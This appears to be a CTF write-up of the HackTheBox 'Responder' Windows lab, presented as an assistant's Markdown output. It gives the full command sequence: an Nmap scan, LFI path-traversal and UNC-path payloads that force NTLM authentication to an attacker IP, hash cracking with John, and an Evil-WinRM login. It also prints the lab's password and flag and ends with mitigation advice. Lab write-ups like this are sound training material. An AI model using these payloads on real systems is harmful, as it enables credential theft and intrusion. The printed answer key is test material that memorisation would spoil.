Here is the complete write-up formatted as Markdown. You can easily copy the contents of the code block below and save it locally as `Responder.md`.

```markdown
# 🚩 Responder - Write-up

## 📝 General Information
| Attribute | Details |
| :--- | :--- |
| **Platform** | HackTheBox |
| **Difficulty** | Easy |
| **OS** | 🪟 Windows |
| **Mode** | 🚩 CTF |
| **Sections** | [1: Reconnaissance & Enumeration](#-1-reconnaissance--enumeration) <br> [2: Initial Foothold](#-2-initial-foothold) <br> [3: Privilege Escalation (Admin)](#-3-privilege-escalation-admin) <br> [4: Pwn3d !!](#-4-pwn3d-) |
| **Date** | 2026-05-31 |

---

## 🎯 Executive Summary
The attack path begins by discovering a Local File Inclusion (LFI) vulnerability in the web application hosted on `unika.htb`. By weaponizing this vulnerability, the server was coerced into attempting to load a file from a malicious, attacker-controlled SMB share. This forced authentication request allowed us to capture the Administrator's NTLMv2 hash using `Responder`. After successfully cracking the hash with `John The Ripper`, direct administrative access was achieved via `Evil-WinRM`, granting full control over the system to retrieve the flag.

---

## 🛠️ Tools Used
`Nmap`, `Responder`, `John The Ripper`, `Evil-WinRM`

---

## 🔍 1: Reconnaissance & Enumeration

* **Attacker IP** = `10.10.16.90`
* **Target IP** = `10.129.86.157`

### 1.1 Port Scanning
```bash
nmap -sS -sV -A -p- -T4 10.129.86.157

```

🧐 **Findings:**
The scan revealed the following open ports:

* **Port 80 (HTTP):** Running `Apache httpd 2.4.52` with `PHP/8.1.1` on a 64-bit Windows environment.
* **Port 5985 (HTTP):** Dedicated to Windows Remote Management (WinRM), running `Microsoft HTTPAPI httpd 2.0`.
* **Port 7680:** tcpwrapped.

### 1.2 Web Enumeration

Navigating to port 80 revealed a website for a company named "UNIKA". The site includes a language-switching feature using a `page` parameter, as seen in the URL `http://unika.htb/index.php?page=german.html`.

Testing this parameter revealed a **Local File Inclusion (LFI)** vulnerability. It was possible to traverse the directory structure and read the local Windows `hosts` file using the following payload:
`http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts`.

---

## 🚪 2: Initial Foothold

* **Vulnerability identified:** Local File Inclusion (LFI) leading to NTLM Hash Theft

**Exploit Steps:**
Instead of merely reading local files, an LFI vulnerability on a Windows environment can be exploited to force the target server to authenticate against an external remote SMB share.

1. First, `Responder` was started on the attacker's machine to listen for incoming authentication requests on the VPN interface:

```bash
sudo responder -I tun0

```

2. Next, an HTTP payload was sent to the vulnerable `page` parameter, directing the target to fetch a non-existent file from the attacker's IP address:

```text
[http://unika.htb/index.php?page=//10.10.16.90/somefile](http://unika.htb/index.php?page=//10.10.16.90/somefile)

```

3. `Responder` successfully intercepted the authentication attempt and captured the NTLMv2-SSP Hash for the `Administrator` user.

---

## 🧠 3: Privilege Escalation (Admin)

* **Current User:** None
* **Target User:** `Administrator`

Since the captured hash belonged directly to the system administrator, cracking it would grant immediate high-privileged access, bypassing the need for a standard user foothold.

**Exploitation:**
The captured hash was saved to a file named `hash.txt` and cracked using `John The Ripper` with the `rockyou.txt` wordlist:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

```

* **Password Found:** `badminton`

**Final Strike:**
With the valid administrator credentials in hand and port `5985` (WinRM) already open, a remote administrative shell was established using `Evil-WinRM`:

```bash
evil-winrm -i 10.129.86.157 -u administrator -p badminton

```

---

## 🏁 4: Pwn3d !!

After successfully logging in as `responder\administrator`, directory enumeration led to the user `mike`'s Desktop, where the final flag was located.

* **Flag:** `ea81b7afddd03efaa0945333ed147fac`

**Mitigation Recommendations:**

1. **Remediate LFI:** Implement strict input validation and sanitization on the `page` parameter. Use an allowlist for permitted files and strip out potentially dangerous characters like `../` and `//`.
2. **Enforce Strong Password Policies:** The password `badminton` is highly insecure and exists in common dictionary lists. Implement complexity requirements for all accounts, especially administrative ones.
3. **Restrict Outbound NTLM Traffic:** Block outbound SMB traffic (Port 445) at the network firewall to prevent servers from inadvertently leaking NTLM hashes to external attacker-controlled machines.

```

```
